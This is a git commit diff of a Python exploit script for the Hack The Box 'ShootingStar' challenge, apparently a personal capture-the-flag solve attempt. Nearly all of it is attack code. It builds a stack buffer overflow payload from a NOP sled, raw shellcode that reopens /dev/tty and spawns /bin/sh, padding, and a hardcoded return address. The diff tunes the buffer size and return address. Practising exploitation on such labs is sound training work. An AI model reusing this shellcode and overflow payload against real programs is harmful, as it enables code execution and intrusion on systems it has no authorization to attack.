fdca1fcf7ebb3dc90fb81f4947c0ae2a41a353f6
badorius <salvadormuntane@gmail.com>
2022-12-14 19:45:58 +0100

    I will not surrender

--- hackthebox/ShootingStar/Files/tshirt.py
+++ hackthebox/ShootingStar/Files/tshirt.py
@@ -4,26 +4,26 @@
 # SHELLCODE = 55
 # NOP = 72 - 55 = 17 bytes
 # Return address = 6 bytes
-# RIP 0x7ffff7e200f5
+# RIP 0x7ffff7e200f5 
 # NOP = 0x90
 
 #print (b"A" * 70 + b"B" * 8) # TOTAL 78
-
-
-menuoption = "1"
-nopsled = b"\x90" * 10 
+buffer = 72
 
 shellcode = b"\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
-# 55 len
 
-padding = b"A"*(78 - len(nopsled) - len(shellcode))
+menuoption = "1"
+nopsled = b"\x90" * (buffer - len(shellcode))
+
+padding = b"A"*(72 - len(nopsled) - len(shellcode))
 
 # 0x7fffffffe5a0
-eip = b"\xa0\xe5\xff\xff\xff\x7f"
+# 0x7fffffffe6b0
+eip = b"\xb0\xe6\xff\xff\xff\x7f"
 
 print (menuoption)
-exploit = nopsled + shellcode + padding + eip
-#print (nopsled + shellcode + padding + eip) 
+#exploit = nopsled + shellcode + padding + eip
+exploit = nopsled + shellcode +  eip
 print (exploit)
 #print (len (exploit))
 
